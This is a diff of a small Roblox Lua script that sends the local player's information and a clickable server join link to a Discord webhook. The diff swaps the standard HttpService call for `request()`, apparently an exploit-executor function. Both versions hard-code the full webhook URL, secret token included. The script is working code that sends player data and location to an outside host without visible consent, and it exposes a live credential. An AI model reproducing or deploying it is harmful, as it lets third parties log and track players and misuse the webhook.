@@ -2,7 +2,7 @@ local p = game:GetService("Players").LocalPlayer
 local h = game:GetService("HttpService")
 local lnk = string.format("roblox://placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
 
-h:PostAsync("https://discord.com/api/webhooks/1530970121978515617/Tsn4zkmjnmOfaUPLdVbouJiirUWmtvDzx_cBUTa8Qk9KD5TEQ8ye2MfTSbjnKzhkWMmN", h:JSONEncode({
+local payload = h:JSONEncode({
 	embeds = {{
 		title = "Player Info",
 		color = 0x5865F2,
@@ -13,4 +13,11 @@ h:PostAsync("https://discord.com/api/webhooks/1530970121978515617/Tsn4zkmjnmOfaU
 			{ name = "Join", value = string.format("[Click to Join](%s)", lnk), inline = false }
 		}
 	}}
-}), Enum.HttpContentType.ApplicationJson)
+})
+
+request({
+	Url = "https://discord.com/api/webhooks/1530970121978515617/Tsn4zkmjnmOfaUPLdVbouJiirUWmtvDzx_cBUTa8Qk9KD5TEQ8ye2MfTSbjnKzhkWMmN",
+	Method = "POST",
+	Headers = { ["Content-Type"] = "application/json" },
+	Body = payload
+})
